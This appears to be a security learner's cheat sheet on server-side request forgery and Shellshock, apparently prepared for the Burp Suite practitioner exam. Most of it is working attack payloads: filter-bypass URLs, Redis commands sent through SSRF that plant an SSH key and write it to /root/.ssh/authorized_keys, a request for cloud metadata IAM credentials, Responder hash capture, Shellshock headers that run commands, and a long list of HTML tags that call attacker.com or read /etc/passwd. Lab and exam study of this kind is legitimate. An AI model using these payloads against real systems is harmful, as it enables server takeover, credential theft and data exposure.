
# Server-side request forgery (SSRF)



**Server-Side Request Forgery (SSRF)**  web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended malicious exploit location URL.

 **SSRF** attack cause the server to make a connection to internal services within the organization, or force the server to connect to arbitrary external systems, potentially leaking sensitive data. Burp scanner may detect SSRF issue as an, `External service interaction (HTTP)`





### CheckList

 **Detection**
 ```sh
 #collab could be burp , webhook , python server 
 ?url=http://<collab>

#internal resource
?url=http://127.0.0.1:8080/
 ```

**RCE**
```
?url=http://<collab>/{whoami}

?url=http://127.0.0.1:6379/flushall

?url=http://127.0.0.1:6379/set ssh_key 'ssh-rsa AAAAB3... user@attacker'"

?url=http://127.0.0.1:6379/config set dir /root/.ssh
?url=http://127.0.0.1:6379/config set dbfilename authorized_keys

?url=http://127.0.0.1:6379/save

?url=php://filter/convert.base64-encode/resource=index.php"

/?url=file:///etc/passwd
```

**Active Dir**

```sh
#we set up Responder on our machine with the following command: “responder -I tun0 -wv”. We then send a request to our Kali IP on a port that is not open, which results in a NetNTLMv2 hashed password
responder -I tun0 -wv

```

**Web**

- [ ]  IP obfuscation `https://h.43z.one/ipconverter/

- [ ]  Use an alternative IP representation of `127.0.0.1`, such as decimal `2130706433`, `017700000001`, or `127.1`.

- [ ] Obfuscate blocked strings using URL encoding or double encoding  , base64...

- [ ] insert the localhost `192.0.0.{0}` bruteforce to check a valid host 

 - [ ] `Host: localhost `

- [ ] Test Referrer Header 

> Payloads 
```


/product/nextProduct?currentProductId=6&path=https://EXPLOIT.net  

stockApi=http://localhost:6566/admin  

?url=http://127.0.0.1:8080/<gobuster  

Host: localhost
```
# LAB

### Basic SSRF against another back-end system


> Need to scan internal network to find IP with 8080 port:

```
stockApi=http://192.168.0.34:8080/admin
```

### SSRF with blacklist-based input filter

>  _**Identify**_ the SSRF in the `stockAPI` parameter, and bypass the block by changing the URL target localhost and admin endpoint to: `http://127.1/%2561dmin`.

> Double URL encode characters in URL to **Obfuscate** the `a` to `%2561`, resulting in the bypass of the blacklist filter. 

```
stockApi=http://127.1/AdMiN/
```

### SSRF with filter bypass via open redirection vulnerability

> in the  blog posts notice that there is a nextproduct option
> notice that path URL param has a subdomain parameter /product/something


```
stockApi=/product/nextProduct?currentProductId=2%26path%3dhttp://192.168.0.12:8080/admin
```

###  Blind SSRF with out-of-band detection


```
Referer: http://burpcollaborator
```

###  SSRF with whitelist-based input filter



```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/
```

###  Admin panel - Download report as PDF SSRF


[![image](https://user-images.githubusercontent.com/58632878/225074847-8daa2242-a99d-423f-888e-111755f04d9c.png)](https://user-images.githubusercontent.com/58632878/225074847-8daa2242-a99d-423f-888e-111755f04d9c.png)

```js
<iframe src='http://localhost:6566/secret' height='500' width='500'>
```


### Absolute GET URL + HOST SSRF

>_**Identify**_ SSRF flawed request parsing vulnerability by changing the `HOST` header to Collaborator server and providing an absolute URL in the GET request line and observe the response from the Collaborator server.


```
GET https://TARGET.net/
Host: OASTIFY.COM
```


### SSRF redirect_uris

>POST request to register data to the client application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary white-list of callback URIs. Observe the redirect_uri.

```
POST /reg HTTP/1.1
Host: oauth-TARGET.web-security-academy.net
Content-Type: application/json
Content-Length: 206

{
"redirect_uris":["https://example.com"],
    "logo_uri" : "https://OASTIFY.COM",
	"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
	
}  
```

# SHELL SHOCK



The Shell-shock problem is an example of an [arbitrary code execution (ACE)](http://en.wikipedia.org/wiki/Arbitrary_code_execution) vulnerability.

```bash
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```

The Shellshock problem specifically occurs when an attacker modifies the origin HTTP request to contain the magic `() { :; };` string

he attacker change the User-Agent header above from `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36` to simply `() { :; }; /bin/eject`.



```bash
() {:;}; /bin/cat /etc/passwd
```

basically its a vulnerability  bash command line interface which is commonly used in linux 
The **Shellshock vulnerability** happens because Bash incorrectly processes some environment variable


SSRF in HTML

```html
<iframe src="http://attacker.com">
<iframe src="http://attacker.com"></iframe>
<iframe src=file:///etc/passwd></iframe>
<style><iframe src="http://attacker.com">
<style><iframe src=file:///etc/passwd>
<style>@import url("http://attacker.com/test.css");</style>
<img src="http://attacker.com">
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<img src="x" onerror="document.write(document.location.href)"" />
<link rel=attachment href="file:///etc/passwd">
<link rel=stylesheet href="http://attacker.com">
<link rel=icon href="http://attacker.com/favicon.ico" type="image/x-icon">
<base href="http://attacker.com" />
<meta http-equiv="refresh" content="0; url=http://attacker.com/" />
<input type="image" src="http://attacker.com" />
<video src="http://attacker.com" />
<video src=file:///etc/passwd />
<video poster="http://attacker.com"></video>
<audio src="http://attacker.com" />
<audio src=file:///etc/passwd />
<audio><source src="http://attacker.com"/></audio>
<svg src="http://attacker.com" />
<svg><image href="http://attacker.com/test.svg" width="400" height="400"></svg>
<svg/onload=document.write(document.location.href)>
<object data="file:///etc/passwd">
<object data="http://attacker.com/test.pdf" type="application/pdf"></object>
<portal src="http://attacker.com" id=portal>
<portal src="file:///etc/passwd" id=portal>
<embed src="http://attacker.com" width="400" height="400">
<embed src="file:///etc/passwd" width="400" height="400">
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
<script> document.write(window.location) </script>
<script>document.write(JSON.stringify(window.location))</script>
<body background="http://attacker.com/test.png">
<div style="background-image: url('http://attacker.com/test.png'); width:400px, height:400px;"></div>
<table background="http://attacker.com/test.png"/>
<form action="http://attacker.com/submit" method="POST"><input type="submit"></form>
<applet codebase="http://attacker.com" code="Test.class" width="0" height="0"></applet>
<track src="http://attacker.com/sub.vtt" kind="subtitles" srclang="en" label="English">
```
# References


- https://github.com/DingyShark/BurpSuiteCertifiedPractitioner?tab=readme-ov-file#server-side-request-forgery-ssrf
